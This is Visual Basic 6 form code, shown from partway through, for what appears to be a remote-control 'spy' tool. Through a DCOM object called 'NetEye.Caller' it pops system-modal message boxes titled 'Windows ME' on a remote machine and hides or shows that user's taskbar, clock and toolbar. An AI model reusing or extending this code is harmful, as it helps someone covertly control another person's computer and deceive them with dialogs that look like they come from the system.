 =   1
               Value           =   1
            EndProperty
            BeginProperty Button4 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Caption         =   "TaskBar Icons"
               Style           =   1
               Value           =   1
            EndProperty
            BeginProperty Button5 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Caption         =   "SysTray Clock"
               Style           =   1
               Value           =   1
            EndProperty
            BeginProperty Button6 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Caption         =   "Windows ToolBar"
               Style           =   1
               Value           =   1
            EndProperty
            BeginProperty Button7 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               Caption         =   "Programs In Taskbar"
               Style           =   1
               Value           =   1
            EndProperty
         EndProperty
      End
   End
   Begin MSComctlLib.ImageList ImgLstIcons 
      Left            =   1800
      Top             =   840
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   4
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMessage.frx":0000
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMessage.frx":0452
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMessage.frx":08A4
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMessage.frx":0CF6
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.CheckBox chkMsgBoxRtlReading 
      Caption         =   "R/L Alignments"
      Height          =   255
      Left            =   120
      TabIndex        =   14
      ToolTipText     =   "Right/Left Aligned "
      Top             =   1080
      Width           =   1455
   End
   Begin MSComctlLib.Toolbar tbrIcons 
      Height          =   390
      Left            =   0
      TabIndex        =   13
      Top             =   0
      Width           =   1755
      _ExtentX        =   3096
      _ExtentY        =   688
      ButtonWidth     =   609
      ButtonHeight    =   582
      Appearance      =   1
      ImageList       =   "ImgLstIcons"
      _Version        =   393216
      BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
         NumButtons      =   5
         BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.ToolTipText     =   "Ciritcal"
            ImageIndex      =   1
            Style           =   2
         EndProperty
         BeginProperty Button2 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.ToolTipText     =   "Question"
            ImageIndex      =   2
            Style           =   2
         EndProperty
         BeginProperty Button3 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.ToolTipText     =   "Exclamation"
            ImageIndex      =   3
            Style           =   2
         EndProperty
         BeginProperty Button4 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.ToolTipText     =   "Information"
            ImageIndex      =   4
            Style           =   2
         EndProperty
         BeginProperty Button5 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.ToolTipText     =   "No Icon"
            Style           =   2
            Value           =   1
         EndProperty
      EndProperty
   End
   Begin VB.TextBox txtPrompt 
      Height          =   615
      Left            =   1680
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   5
      ToolTipText     =   "Enter Your Prompt"
      Top             =   720
      Width           =   2535
   End
   Begin VB.TextBox txtTitle 
      Height          =   285
      Left            =   120
      TabIndex        =   4
      ToolTipText     =   "MessageBox Title"
      Top             =   720
      Width           =   1455
   End
   Begin VB.Frame fraMsgBoxStyle 
      Caption         =   "MessageBox Style Button"
      Height          =   1095
      Left            =   120
      TabIndex        =   2
      Top             =   1440
      Width           =   3135
      Begin VB.OptionButton optMsgBoxStyle 
         Caption         =   "Retry Cancel"
         Height          =   255
         Index           =   5
         Left            =   1320
         TabIndex        =   11
         Top             =   720
         Width           =   1335
      End
      Begin VB.OptionButton optMsgBoxStyle 
         Caption         =   "Abort Retry Ignore"
         Height          =   255
         Index           =   2
         Left            =   1320
         TabIndex        =   10
         Top             =   480
         Width           =   1695
      End
      Begin VB.OptionButton optMsgBoxStyle 
         Caption         =   "Yes No Cancel"
         Height          =   255
         Index           =   3
         Left            =   1320
         TabIndex        =   9
         Top             =   240
         Width           =   1695
      End
      Begin VB.OptionButton optMsgBoxStyle 
         Caption         =   "Yes No"
         Height          =   255
         Index           =   4
         Left            =   120
         TabIndex        =   8
         Top             =   720
         Width           =   975
      End
      Begin VB.OptionButton optMsgBoxStyle 
         Caption         =   "OK Cancel"
         Height          =   255
         Index           =   1
         Left            =   120
         TabIndex        =   7
         Top             =   480
         Width           =   1215
      End
      Begin VB.OptionButton optMsgBoxStyle 
         Caption         =   "OK"
         Height          =   255
         Index           =   0
         Left            =   120
         TabIndex        =   6
         Top             =   240
         Value           =   -1  'True
         Width           =   615
      End
   End
   Begin VB.CommandButton cmdOK 
      Caption         =   "O K"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3360
      TabIndex        =   1
      Top             =   1560
      Width           =   855
   End
   Begin VB.CommandButton cmdCancel 
      Caption         =   "Cancel"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3360
      TabIndex        =   0
      Top             =   2160
      Width           =   855
   End
   Begin VB.Label lblShowHide 
      Alignment       =   1  'Right Justify
      ForeColor       =   &H00C000C0&
      Height          =   255
      Left            =   120
      TabIndex        =   18
      Top             =   2640
      Width           =   4095
   End
   Begin VB.Label lblDummy 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Connection Oriented Messaging"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000C0&
      Height          =   195
      Index           =   2
      Left            =   1800
      TabIndex        =   15
      ToolTipText     =   "Unless MessageBox is retained over remote machine. you spy will be hung"
      Top             =   120
      Width           =   2715
   End
   Begin VB.Label lblDummy 
      AutoSize        =   -1  'True
      Caption         =   "Dialog Prompt:------------------------------"
      Height          =   195
      Index           =   1
      Left            =   2040
      TabIndex        =   12
      Top             =   480
      Width           =   1545
   End
   Begin VB.Label lblDummy 
      AutoSize        =   -1  'True
      Caption         =   "Dialog Title:------------------"
      Height          =   195
      Index           =   0
      Left            =   120
      TabIndex        =   3
      Top             =   480
      Width           =   1290
   End
End
Attribute VB_Name = "frmMessage"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private intMsgBoxStyle As Integer
Private intMsgBoxIcon As Integer
Private lngMsgBoxRtlReading As Long

Private Sub chkMsgBoxRtlReading_Click()
 If chkMsgBoxRtlReading.Value = Checked Then
  lngMsgBoxRtlReading = vbMsgBoxRtlReading
 Else
  lngMsgBoxRtlReading = 0
 End If
End Sub

Private Sub cmdCancel_Click()
 Unload Me
End Sub

Private Sub cmdOK_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
 Dim lngButton As Long, objCaller As Object
 Dim strTitle As String, intMsgBoxResult As Integer, strMsgBoxResult As String
  On Error GoTo EH
  
  strTitle = Trim(txtTitle)
  If strTitle = vbNullString Then strTitle = "Windows ME"
  lngButton = intMsgBoxStyle + intMsgBoxIcon + lngMsgBoxRtlReading
  
 If Button = vbLeftButton Then
   Query.txtDisplay.Text = "Wait! Unless your Dialog box is Entertained!"
   DoEvents
   Set objCaller = CreateObject("NetEye.Caller", Query.cboRemoteIP)
   intMsgBoxResult = objCaller.InvokeMessageBox(txtPrompt.Text, lngButton + vbSystemModal, strTitle)
   Unload frmMessage
   Select Case intMsgBoxResult
    Case vbOK: strMsgBoxResult = "OK"
    Case vbCancel: strMsgBoxResult = "Cancel"
    Case vbYes: strMsgBoxResult = "Yes"
    Case vbNo: strMsgBoxResult = "No"
    Case vbAbort: strMsgBoxResult = "Abort"
    Case vbRetry: strMsgBoxResult = "Retry"
    Case vbIgnore: strMsgBoxResult = "Ignore"
    Case 419: strMsgBoxResult = " Error " & vbCrLf & "Source = NetEye.Caller"
    Case 420: strMsgBoxResult = " Error " & vbCrLf & "Source = Spy.Daemons"
   End Select
   Query.txtDisplay = Query.cboRemoteIP & " answered " & strMsgBoxResult
    
 ElseIf Button = vbRightButton Then
   MsgBox txtPrompt, lngButton, strTitle
 End If
 intMsgBoxStyle = 0
 
 Exit Sub
EH:
  Query.txtDisplay.Text = Err.Description & vbCrLf & Err.Number
End Sub

Private Sub optMsgBoxStyle_Click(Index As Integer)
 intMsgBoxStyle = Index
End Sub

Private Sub tbrIcons_ButtonClick(ByVal Button As MSComctlLib.Button)
 Select Case Button.Index
    Case 1: intMsgBoxIcon = 16
    Case 2: intMsgBoxIcon = 32
    Case 3: intMsgBoxIcon = 48
    Case 4: intMsgBoxIcon = 64
    Case 5: intMsgBoxIcon = 0
 End Select
End Sub

Private Sub tbrShowHide_ButtonClick(Index As Integer, ByVal Button As MSComctlLib.Button)
Dim objCaller As Object
On Error GoTo EH
 Set objCaller = CreateObject("NetEye.Caller", Query.cboRemoteIP)
 lblShowHide = objCaller.ShowHide(Button.Caption, Button.Value)
 Exit Sub
EH:
 MsgBox Err.Number & Err.Description
End Sub
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Attribute VB_Name = "basDeclarations"

                                                                                        